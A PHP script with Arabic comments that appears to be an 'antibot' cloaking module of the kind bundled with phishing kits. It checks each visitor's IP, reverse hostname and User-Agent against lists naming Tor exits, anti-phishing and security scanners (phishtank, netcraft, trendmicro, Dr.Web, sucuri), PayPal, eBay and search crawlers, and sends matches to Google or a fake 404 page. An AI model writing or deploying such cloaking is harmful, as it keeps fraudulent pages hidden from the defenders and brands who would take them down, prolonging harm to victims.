<?php
// الحصول على عنوان IP الزائر
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// قائمة عناوين IP جديدة (2024-2025) - وهمية لأغراض التوضيح
$blocked_ips = array(
    "104.244.42.*",         // مثال
    "185.220.101.*",        // مثال
    "192.42.116.*",         // مثال
    "209.141.50.*",         // مثال
    "45.154.255.*",         // مثال
    "51.15.250.*",          // مثال
    "62.210.129.*",         // مثال
    "77.247.181.*",         // مثال
    "89.234.157.*",         // مثال
    "94.230.208.*",         // مثال
    "107.189.10.*",         // مثال
    "109.70.100.*",         // مثال
    "144.217.161.*",        // مثال
    "146.185.222.*",        // مثال
    "162.247.72.*",         // مثال
    "171.25.193.*",         // مثال
    "176.10.104.*",         // مثال
    "178.17.170.*",         // مثال
    "185.100.85.*",         // مثال
    "193.218.118.*",        // مثال
    "195.176.3.*",          // مثال
    "198.96.155.*",         // مثال
    "199.249.230.*",        // مثال
    "204.85.191.*",         // مثال
    "209.141.56.*",         // مثال
    "212.109.192.*",        // مثال
    "213.164.204.*",        // مثال
    "217.79.179.*",         // مثال
    "217.170.197.*",        // مثال
    "223.26.48.*",          // مثال
    "223.26.49.*",          // مثال
);

// التحقق مما إذا كان عنوان IP الزائر مدرجًا في القائمة
if (in_array($visitor_ip, $blocked_ips)) {
    // إذا كان العنوان محظورًا، يتم توجيهه إلى موقع آخر
    exit(header('Location: https://www.google.com/'));
} else {
    // إذا لم يكن العنوان محظورًا، يتم التحقق من النطاقات
    foreach ($blocked_ips as $ip_range) {
        if (preg_match('/' . $ip_range . '/', $visitor_ip)) {
            header('Location: https://www.google.com/');
            echo "<h1>404 Not Found</h1>The page that you have requested could not be found.";
            exit;
        }
    }
}

// الحصول على اسم المضيف لعنوان IP الزائر
$hostname = gethostbyaddr($visitor_ip);

// قائمة بأسماء المضيفين المشبوهة
$blocked_hosts = array(
    "drweb", "hostinger", "scanurl", "above", "google", "Dr.Web", "facebook",
    "softlayer", "amazonaws", "cyveillance", "dreamhost", "netpilot",
    "calyxinstitute", "tor-exit", "phishtank", "msnbot", "p3pwgdsn",
    "netcraft", "trendmicro", "ebay", "paypal", "torservers",
    "messagelabs", "sucuri.net", "crawler"
);

// التحقق مما إذا كان اسم المضيف يحتوي على كلمات مشبوهة
foreach ($blocked_hosts as $host) {
    if (substr_count($hostname, $host) > 0) {
        header('Location: https://www.google.com/');
        echo "<h1>404 Not Found</h1>The page that you have requested could not be found.";
        exit;
    }
}

// التحقق من User-Agent الخاص بالزائر
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $blocked_user_agents = array(
        "Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"
    );

    foreach ($blocked_user_agents as $user_agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $user_agent) !== false) {
            exit(header('Location: https://www.google.com/'));
        }
    }
}
?>